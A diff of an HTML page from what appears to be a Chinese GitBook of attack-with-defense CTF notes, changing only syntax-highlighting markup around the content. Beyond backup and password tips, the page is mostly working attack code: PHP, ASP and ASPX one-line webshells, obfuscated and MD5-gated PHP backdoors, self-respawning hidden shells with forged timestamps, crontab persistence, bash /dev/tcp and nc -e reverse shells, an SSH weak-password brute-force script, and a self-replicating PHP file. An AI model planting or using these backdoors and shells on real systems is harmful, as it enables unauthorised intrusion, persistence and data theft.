@@ -53,10 +53,6 @@
                 
             
                 
-                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
-                
-            
-                
                 <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                 
             
@@ -3288,24 +3284,24 @@
 <p>## SSH&#x767B;&#x5F55;</p>
 <p>&#x53E3;&#x4EE4;&#x767B;&#x5F55;</p>
 <p>&#x547D;&#x4EE4;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A; ssh &#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x540D;@&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</p>
-<pre class="language-"><code>ssh &#x7528;&#x6237;&#x540D;@ip
+<pre><code>ssh &#x7528;&#x6237;&#x540D;@ip
 ssh ctf@192.168.182.130
 </code></pre><p>&#x5982;&#x679C;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x7684;22&#x7AEF;&#x53E3;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; -p &#x9009;&#x9879;&#x6765;&#x4FEE;&#x6539;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x6BD4;&#x5982;&#x8FDE;&#x63A5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;2222&#x7AEF;&#x53E3;</p>
-<pre class="language-"><code>ssh -p &#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x53F7; &#x7528;&#x6237;&#x540D;@ip
+<pre><code>ssh -p &#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x53F7; &#x7528;&#x6237;&#x540D;@ip
 ssh -p 2222 ctf@192.168.182.130
 </code></pre><p>&#x9664;&#x6B64;&#x4E4B;&#x5916;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Finalshell&#x6216;&#x8005;Xshell&#x7B49;&#x56FE;&#x5F62;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;</p>
 </li>
 </ul>
 <p><strong>&#x5BC6;&#x94A5;&#x767B;&#x5F55;</strong>
 &#x7528;id_rsa&#x7528;&#x4E8E;&#x767B;&#x9646;&#x9776;&#x673A;&#xFF0C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</p>
-<pre class="language-"><code>sftp -i id_rsa ctf@192.168.182.130
+<pre><code>sftp -i id_rsa ctf@192.168.182.130
 </code></pre><h2 id="&#x6539;&#x5BC6;&#x7801;">&#x6539;&#x5BC6;&#x7801;</h2>
 <p>&#x5B98;&#x65B9;&#x5728;&#x7ED9;&#x51FA;&#x670D;&#x52A1;&#x5668;&#x5BC6;&#x7801;&#x65F6;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#xFF0C;&#x90A3;&#x5C31;&#x9700;&#x8981;&#x8D76;&#x5FEB;&#x4FEE;&#x6539;&#x81EA;&#x5DF1;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4F46;&#x4E00;&#x822C;&#x4E3B;&#x529E;&#x65B9;&#x7ED9;&#x7684;&#x662F;&#x968F;&#x673A;&#x5BC6;&#x7801;&#x3002;</p>
 <p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;SSH&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#x53E3;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x6539;&#x4E86;&#x90A3;&#x5C31;gg&#x4E86;&#xFF0C;&#x540C;&#x65F6;&#x8981;&#x51C6;&#x5907;&#x597D;&#x6279;&#x91CF;&#x811A;&#x672C;&#xFF0C;&#x4E00;&#x65E6;&#x662F;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p>
 <p>SSH&#x5BC6;&#x7801;&#x4FEE;&#x6539;:</p>
-<pre class="language-"><code>passwd
+<pre><code>passwd
 </code></pre><p>mysql&#x5BC6;&#x7801;&#x4FEE;&#x6539;:</p>
-<pre class="language-"><code>#&#x65B9;&#x6CD5;&#x4E00;
+<pre><code>#&#x65B9;&#x6CD5;&#x4E00;
 show databases;
 use mysql
 set password for root@localhost = password(&apos;123&apos;);
@@ -3318,7 +3314,7 @@ show tables;
 <p>&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;(/var/www/html)&#xFF0C;&#x5907;&#x4EFD;&#x7684;&#x76EE;&#x7684;&#x5728;&#x4E8E;&#x4E07;&#x4E00;&#x5BF9;&#x65B9;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x8FDB;&#x5165;&#x4F60;&#x7684;&#x9776;&#x673A;&#x5C06;&#x4F60;&#x7684;WWW&#x4E0B;&#x7684;&#x76EE;&#x5F55;&#x7ED9;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x53CA;&#x65F6;&#x6062;&#x590D;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x6CA1;&#x6709;&#x5907;&#x4EFD;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x5B95;&#x673A;&#x4E86;</p>
 <p>&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#xFF0C;&#x5907;&#x4EFD;&#x7F51;&#x7AD9;&#x76EE;&#x5F55;&#x53CA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E00;&#x822C;&#x5728; /var/www/html &#x76EE;&#x5F55;&#x3002;</p>
 <p>1.&#x76EE;&#x5F55;&#x6253;&#x5305;</p>
-<pre class="language-"><code>&#x6253;&#x5305;
+<pre><code>&#x6253;&#x5305;
 tar -zcvf archive_name.tar.gz  directory_to_compress
 &#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x4F7F;&#x7528;tar&#x547D;&#x4EE4;&#x6253;&#x5305;&#x6587;&#x4EF6;&#x5939;&#xFF0C;.index.php&#xFF08;&#x9690;&#x85CF;&#x7C7B;&#x578B;&#x6587;&#x4EF6;&#xFF09;&#x5C06;&#x4E0D;&#x4F1A;&#x88AB;&#x6253;&#x5305;
 
@@ -3333,22 +3329,22 @@ tar -zxvf archive_name.tar.gz
 <ul>
 <li>&#x5907;&#x4EFD;&#x6307;&#x5B9A;&#x7684;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;</li>
 </ul>
-<pre class="language-"><code>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql
+<pre><code>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql
 </code></pre><p>&#x65E0; lock tables &#x6743;&#x9650;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</p>
-<pre class="language-"><code>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql
+<pre><code>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql
 </code></pre><ul>
 <li>&#x6062;&#x590D;&#x5907;&#x4EFD;&#xFF08;&#x5728; MySQL &#x7EC8;&#x7AEF;&#x4E0B;&#x6267;&#x884C;&#xFF09;</li>
 </ul>
-<pre class="language-"><code>source FILE_PATH
+<pre><code>source FILE_PATH
 </code></pre><ul>
 <li>&#x91CD;&#x7F6E; MySQL &#x5BC6;&#x7801;&#xFF08;&#x5728; MySQL &#x7EC8;&#x7AEF;&#x4E0B;&#x6267;&#x884C;&#xFF09;</li>
 </ul>
 <p>&#x65B9;&#x6CD5; 1</p>
-<pre class="language-"><code>set password for &#x7528;&#x6237;&#x540D;@localhost = password(&quot;&#x65B0;&#x5BC6;&#x7801;&quot;)
+<pre><code>set password for &#x7528;&#x6237;&#x540D;@localhost = password(&quot;&#x65B0;&#x5BC6;&#x7801;&quot;)
 </code></pre><p>&#x65B9;&#x6CD5; 2</p>
-<pre class="language-"><code>mysqladmin -u&#x7528;&#x6237;&#x540D; -p&#x65E7;&#x5BC6;&#x7801; password &#x65B0;&#x5BC6;&#x7801;
+<pre><code>mysqladmin -u&#x7528;&#x6237;&#x540D; -p&#x65E7;&#x5BC6;&#x7801; password &#x65B0;&#x5BC6;&#x7801;
 </code></pre><p>3.&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;</p>
-<pre class="language-"><code>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
+<pre><code>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
 </code></pre><h2 id="&#x67E5;&#x627E;&#x9884;&#x7559;&#x540E;&#x95E8;">&#x67E5;&#x627E;&#x9884;&#x7559;&#x540E;&#x95E8;</h2>
 <p>&#x7528;D&#x76FE;&#x626B;&#x63CF;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x67E5;&#x627E;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x9776;&#x673A;&#x4E0A;&#x7684;&#x540E;&#x95E8;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x95E8;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x9776;&#x673A;&#x3002;</p>
 <p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; seay&#x8FDB;&#x884C;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</p>
@@ -3367,7 +3363,7 @@ tar -zxvf archive_name.tar.gz
 <li>nmap&#x3001;Routescan</li>
 <li>Python &#x811A;&#x672C;</li>
 </ul>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 for x in range(2,255): 
     url = &quot;http://192.168.1.{}&quot;.format(x) 
     try: 
@@ -3377,11 +3373,11 @@ for x in range(2,255):
         pass
 </code></pre><h2 id="&#x540E;&#x95E8;&#x5229;&#x7528;">&#x540E;&#x95E8;&#x5229;&#x7528;</h2>
 <p>curl&#x8BFB;flag</p>
-<pre class="language-"><code>C:\Users\admin&gt;curl &quot;http://192.168.182.130:8801/include/shell.php&quot; -d &quot;admin_ccmd=system(&apos;cat /f*&apos;);&quot;
+<pre><code>C:\Users\admin&gt;curl &quot;http://192.168.182.130:8801/include/shell.php&quot; -d &quot;admin_ccmd=system(&apos;cat /f*&apos;);&quot;
 SL{4a0be463dd85555090f2216795677916d2447242}
 flag{glzjin_wants_a_girl_friend}
 </code></pre><p>&#x811A;&#x672C;</p>
-<pre class="language-"><code>&#x7AEF;&#x53E3;
+<pre><code>&#x7AEF;&#x53E3;
 #coding=utf-8
 import requests
 url_head=&quot;http://192.168.182.130&quot;   #&#x7F51;&#x6BB5;
@@ -3415,11 +3411,11 @@ for i in range(8000,8004):
 flag.close()
 </code></pre><h2 id="&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;">&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</h2>
 <p>&#x5E38;&#x7528;&#x8BED;&#x8A00;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</p>
-<pre class="language-"><code>php&#xFF1A; <span class="token prolog">&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span> <span class="token attr-name">eval($_GET[&apos;pass&apos;]);</span>
-<span class="token attr-name">asp&#xFF1A;</span>   <span class="token attr-name">&lt;%eval</span> <span class="token attr-name">request</span> <span class="token attr-name">(&quot;pass&quot;)%</span><span class="token punctuation">&gt;</span></span>
+<pre><code>php&#xFF1A; &lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;      &lt;?php eval($_GET[&apos;pass&apos;]);
+asp&#xFF1A;   &lt;%eval request (&quot;pass&quot;)%&gt;
 aspx&#xFF1A;  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
 </code></pre><p>&#x8681;&#x5251;&#x8FDE;&#x63A5;get&#x578B;&#x6728;&#x9A6C;&#xFF0C;&#x4E4B;&#x524D;&#x4E00;&#x76F4;&#x4E0D;&#x4F1A;&#x7528;&#x8681;&#x5251;&#x8FDE;&#x63A5;get&#x578B;&#x6728;&#x9A6C;&#xFF0C;&#x8FD9;&#x91CC;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x3002;</p>
-<pre class="language-"><code>&lt;?php eval($_GET[&apos;pass&apos;]);
+<pre><code>&lt;?php eval($_GET[&apos;pass&apos;]);
 
 /shell.php?pass=eval($_POST[1]);
 &#x8FDE;&#x63A5;&#x5BC6;&#x7801;&#xFF1A;1
@@ -3428,7 +3424,7 @@ aspx&#xFF1A;  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.It
 <p><strong>1.&#x628A;shell.php&#x547D;&#x540D;&#x4E3A;.shell.php</strong></p>
 <p>.shell.php&#x5728;&#x6267;&#x884C;ls&#x65F6;&#x65E0;&#x6CD5;&#x88AB;&#x67E5;&#x770B;&#x5230;&#xFF0C;&#x642D;&#x914D;ls&#x7684;&#x53C2;&#x6570;&#x624D;&#x80FD;&#x88AB;&#x53D1;&#x73B0;
 &#x5B8C;&#x6574;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</p>
-<pre class="language-"><code>[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php
+<pre><code>[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php
 [sss@ecs-centos-7 awd]$ ls
 shell.php
 [sss@ecs-centos-7 awd]$ mv shell.php .shell.php
@@ -3442,7 +3438,7 @@ drwx------ 4 sss sss 4096 12&#x6708;  29 22:51 ..
 &#x4ECE;&#x4E0A;&#x9762;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;ls&#x52A0;&#x53C2;&#x6570;&#x624D;&#x80FD;&#x67E5;&#x770B;&#x5230;shell&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x5199;&#x4E00;&#x4E2A;-shell.php&#x3001;
 &#x547D;&#x4EE4;&#x884C;&#x4F1A;&#x628A;-&#x540E;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x5F53;&#x6210;&#x53C2;&#x6570;&#x6267;&#x884C;&#xFF0C;&#x6267;&#x884C;&#x5373;&#x4F7F;&#x88AB;&#x53D1;&#x73B0;&#xFF0C;&#x4F7F;&#x7528;rm&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x4F1A;&#x88AB;&#x5F53;&#x6210;&#x662F;rm&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x751F;&#x62A5;&#x9519;&#xFF0C;&#x65E0;&#x6CD5;&#x5220;&#x9664;shell&#xFF0C;&#x76EE;&#x7684;&#x4E5F;&#x8FBE;&#x5230;&#x4E86;</p>
 <p>&#x5B8C;&#x6574;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</p>
-<pre class="language-"><code>[sss@ecs-centos-7 awd]$ ls
+<pre><code>[sss@ecs-centos-7 awd]$ ls
 -shell.php
 [sss@ecs-centos-7 awd]$ rm -shell.php 
 rm&#xFF1A;&#x65E0;&#x6548;&#x9009;&#x9879; -- s
@@ -3454,47 +3450,47 @@ Try &apos;rm ./-shell.php&apos; to remove the file &quot;-shell.php&quot;.
 Try &apos;rm --help&apos; for more information.
 </code></pre><h2 id="&#x7279;&#x6B8A;&#x7684;shell">&#x7279;&#x6B8A;&#x7684;shell</h2>
 <p>shell1&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</span>
+<pre><code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;
 </code></pre><p>&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#xFF1A;php?2=assert&#x5BC6;&#x7801;&#x662F;1&#x3002;</p>
 <p>shell2&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 $a=chr( 96^5);
 $b=chr( 57^79);
 $c=chr( 15^110);
 $d=chr( 58^86);
 $e= &apos;($_REQUEST[C])&apos;;
 @assert($a.$b.$c.$d.$e);
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x914D;&#x7F6E;&#x4E3A;?b=))99(rhC(tseuqeR+lave</p>
 <p>shell3&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 $sF= &quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[&apos;n985de9&apos;];if(isset($s22)){eval($s21($s22));}
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x914D;&#x7F6E;&#x586B;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=
 &#x8FDE;&#x63A5;&#x5BC6;&#x7801;:0&#xFF08;&#x96F6;&#xFF09;</p>
 <p>shell4&#xFF1A;MD5&#x6728;&#x9A6C;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 if(md5($_POST[&apos;pass&apos;])==&apos;d8d1a1efe0134e2530f503028a825253&apos;)
 @eval($_POST[&apos;cmd&apos;]);
-?&gt;</span>
+?&gt;
 </code></pre><p>shell5&#xFF1A;MD5&#x6728;&#x9A6C;+&#x5229;&#x7528;header
 2021ISCC&#x6CB3;&#x5357;&#x8D5B;&#x533A;&#x7EBF;&#x4E0B;&#x8D5B;&#x5C31;&#x662F;&#x8FD9;&#x79CD;shell&#xFF0C;&#x5F53;&#x65F6;&#x5DEE;&#x70B9;&#x6CA1;&#x770B;&#x51FA;&#x6765;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 echo &apos;hello&apos;;
 if(md5($_POST[&apos;pass&apos;])==&apos;d8d1a1efe0134e2530f503028a825253&apos;)
 if (@$_SERVER[&apos;HTTP_USER_AGENT&apos;] == &apos;flag&apos;){
 $test= &apos;flag&apos;;
 header(&quot;flag:$test&quot;);
 }
-?&gt;</span>
+?&gt;
 </code></pre><h2 id="&#x4E0D;&#x6B7B;&#x9A6C;">&#x4E0D;&#x6B7B;&#x9A6C;</h2>
 <p>&#x4E0D;&#x6B7B;&#x9A6C;&#x793A;&#x4F8B;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = &apos;shell.php&apos;;
-$code = &apos;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;){@eval($_REQUEST[&apos;cmd&apos;]);} ?&gt;</span>&apos;;
+$code = &apos;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;){@eval($_REQUEST[&apos;cmd&apos;]);} ?&gt;&apos;;
 while (1){
     file_put_contents($file,$code);
     system(&apos;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&apos;);
@@ -3506,13 +3502,13 @@ while (1){
 #POST&#x4F20;&#x53C2;&#xFF1A;passwd=y0range857&amp;a=system(&apos;ls&apos;);
 </code></pre><p>&#x5C06;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#xFF0C;&#x4F1A;&#x5728;&#x8BE5;&#x8DEF;&#x5F84;&#x4E0B;&#x4E00;&#x76F4;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x540D;&#x5B57;&#x4E3A;shell2.php&#x7684;shell&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;caidao&#x8F93;&#x5165;<a href="http://xxx/shell2.php?pass=pass&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;a&#x5C31;&#x53EF;&#x4EE5;&#x94FE;&#x63A5;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x7531;&#x4E8E;pass&#x662F;md5&#x52A0;&#x5BC6;&#x5F88;&#x96BE;&#x88AB;&#x7834;&#x89E3;&#x4E5F;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9690;&#x853D;,md5&#x503C;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x5B9A;&#x4E49;&#x3002;" target="_blank">http://xxx/shell2.php?pass=pass&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;a&#x5C31;&#x53EF;&#x4EE5;&#x94FE;&#x63A5;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x7531;&#x4E8E;pass&#x662F;md5&#x52A0;&#x5BC6;&#x5F88;&#x96BE;&#x88AB;&#x7834;&#x89E3;&#x4E5F;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9690;&#x853D;,md5&#x503C;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x5B9A;&#x4E49;&#x3002;</a></p>
 <p>&#x5199;&#x5165;shell&#xFF0C; at.php&#x5185;&#x5BB9;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = &apos;.login.php&apos;;
 $file1 = &apos;/admin/.register.php&apos;; 
-$code = &apos;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;){@eval($_REQUEST[&quot;at&quot;]);} ?&gt;</span>&apos;;
+$code = &apos;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;){@eval($_REQUEST[&quot;at&quot;]);} ?&gt;&apos;;
 while (1){
     file_put_contents($file,$code);
     system(&apos;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&apos;);
@@ -3522,42 +3518,42 @@ while (1){
 }
 ?&gt;
 </code></pre><p>&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;at.php&#xFF0C;&#x4F1A;&#x751F;&#x6210;&#x4E0D;&#x6B7B;&#x9A6C;at2.php</p>
-<pre class="language-"><code>url/upload/at.php
+<pre><code>url/upload/at.php
 </code></pre><p>&#x518D;&#x4F20;&#x5165;&#xFF0C;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;getshell</p>
-<pre class="language-"><code>url/upload/at2.php?passwd=obse007&amp;at=system(&apos;ls&apos;);
+<pre><code>url/upload/at2.php?passwd=obse007&amp;at=system(&apos;ls&apos;);
 </code></pre><h2 id="&#x6743;&#x9650;&#x7EF4;&#x6301;">&#x6743;&#x9650;&#x7EF4;&#x6301;</h2>
 <p>&#x9884;&#x7559;&#x540E;&#x95E8;&#x7684;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x4E0D;&#x8981;&#x6025;&#x7740;&#x62FF;flag&#xFF0C;&#x5F80;&#x540E;&#x6BCF;&#x4E00;&#x8F6E;&#x9884;&#x7559;&#x540E;&#x95E8;&#x90FD;&#x4F1A;&#x51CF;&#x5C11;&#xFF0C;&#x672A;&#x96E8;&#x7EF8;&#x7F2A;&#x3002;
 <strong>crontab&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</strong>
 1.&#x4F7F;&#x7528;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x5199;&#x9A6C;</p>
-<pre class="language-"><code>system(&apos;echo &quot;* * * * * echo \&quot;&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\&apos;462d4a0e7cedd6b024a4d99f10c614d1\&apos;){@eval(\\\\\\\\\$_POST[1]);}  \&quot; &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&apos;);
+<pre><code>system(&apos;echo &quot;* * * * * echo \&quot;&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\&apos;462d4a0e7cedd6b024a4d99f10c614d1\&apos;){@eval(\\\\\\\\\$_POST[1]);}  \&quot; &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&apos;);
 </code></pre><p>&#x5BC6;&#x7801;&#xFF1A;atkx
 &#x6765;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</p>
 <p>2.&#x4F7F;&#x7528;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x53D1;&#x9001;&#x5E26;&#x6709;flag&#x7684;&#x8BF7;&#x6C42;</p>
-<pre class="language-"><code>bash# &#x7F16;&#x8F91; crontab&#xFF1A;crontab -e
+<pre><code>bash# &#x7F16;&#x8F91; crontab&#xFF1A;crontab -e
 */5 * * * * curl 10.10.10.5:8000/submit_flag/ -d &apos;flag=&apos;$(cat /home/web/flag/flag)&apos;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&apos;
 # &#x67E5;&#x8BE2; crontab&#xFF1A;crontab -l
 </code></pre><p>3.&#x4F7F;&#x7528;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x53CD;&#x5F39;shell</p>
-<pre class="language-"><code>bash -c bash&apos;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&apos;
+<pre><code>bash -c bash&apos;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&apos;
 
 nc -e /bin/bash 1.3.3.7 4444 bash
 </code></pre><p><strong>&#x53CD;&#x5F39;shell</strong>
 nc&#x53CD;&#x5F39;shell</p>
-<pre class="language-"><code>bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1
 </code></pre><p>&#x672C;&#x5730;</p>
-<pre class="language-"><code>nc -l -p 6666
+<pre><code>nc -l -p 6666
 </code></pre><h2 id="&#x8F6F;&#x94FE;&#x63A5;">&#x8F6F;&#x94FE;&#x63A5;</h2>
 <p>&#x8F6F;&#x8FDE;&#x63A5;&#x8BED;&#x6CD5;&#xFF1A;</p>
-<pre class="language-"><code>ln -s  [shell&#x8DEF;&#x5F84;]   [&#x65B0;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;]
+<pre><code>ln -s  [shell&#x8DEF;&#x5F84;]   [&#x65B0;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;]
 </code></pre><p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;
 &#x8BBF;&#x95EE;/upload/new.php&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x8BBF;&#x95EE;/upload/shell.php</p>
-<pre class="language-"><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php
+<pre><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php
 </code></pre><p>&#x8F6F;&#x8FDE;&#x63A5;&#x5229;&#x7528;</p>
-<pre class="language-"><code>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
+<pre><code>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
 root@086f12c38b93:~# cat /var/www/html/css/flag.css
 SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}
 </code></pre><p>&#x7136;&#x540E;&#x8BBF;&#x95EE;url/css/flag.css&#x5373;&#x53EF;&#x5F97;&#x5230;flag</p>
 <h2 id="ssh&#x5F31;&#x5BC6;&#x7801;&#x5229;&#x7528;">SSH&#x5F31;&#x5BC6;&#x7801;&#x5229;&#x7528;</h2>
-<pre class="language-"><code>#-*- coding:utf-8 -*-
+<pre><code>#-*- coding:utf-8 -*-
 import paramiko
 ip = &apos;192.168.1.137&apos;
 port = &apos;22&apos;
@@ -3581,7 +3577,7 @@ print(a)
 
 #SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}
 </code></pre><p>&#x6279;&#x91CF;</p>
-<pre class="language-"><code>#-*- coding:utf-8 -*-
+<pre><code>#-*- coding:utf-8 -*-
 import paramiko
 import threading
 import queue
@@ -3664,30 +3660,30 @@ for x in range(th_num):
 </code></pre><h2 id=""> </h2>
 <h2 id="&#x653B;&#x51FB;&#x6405;&#x5C4E;">&#x653B;&#x51FB;&#x6405;&#x5C4E;</h2>
 <p>&#x65E0;&#x9650;&#x590D;&#x5236;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
   set_time_limit(0);
   ignore_user_abort(true);
   while(1){
       file_put_contents(randstr().&apos;.php&apos;,file_get_content(__FILE__));
